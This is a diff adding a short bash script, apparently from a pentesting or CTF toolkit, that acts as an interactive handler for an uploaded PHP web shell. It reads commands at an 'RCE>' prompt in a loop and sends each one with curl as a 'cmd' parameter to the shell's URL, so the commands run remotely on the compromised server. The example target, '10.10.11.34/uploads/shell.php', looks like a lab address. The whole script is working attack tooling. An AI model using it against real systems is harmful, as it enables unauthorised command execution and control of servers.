@@ -1,0 +1,41 @@
+#!/bin/bash
+
+RED="\e[31m"
+BLUE="\e[34m"
+MAGENTA="\e[35m"
+ENDCOLOR="\e[0m"
+
+function help() {
+    echo -e "Usage:"
+    echo -e "\t${BLUE}webshell-handler${ENDCOLOR} ${MAGENTA}<URL>${ENDCOLOR}"
+
+    echo -e "Example:"
+    echo -e "\t${BLUE}webshell-handler${ENDCOLOR} 'http://10.10.11.34/uploads/shell.php'"
+
+    exit 0
+}
+
+function error() {
+    echo -e "\n${RED}[x]${ENDCOLOR} Error: $1"
+    exit 1
+}
+
+if [[ "$1" == "-h" || "$1" == "--help" || "$2" == "-h" || "$2" == "--help" ]]; then
+    help
+fi
+
+if [[ "$#" -ne 1 ]]; then
+    error "No url provided"
+fi
+
+while true; do
+    echo -ne "${RED}RCE>${ENDCOLOR} "
+    read -r cmd
+
+    if [[ "$cmd" == "exit" ]]; then
+        exit 0
+    fi
+
+    curl -q -k -G "$1" --data-urlencode "cmd=${cmd}"
+    echo ""
+done
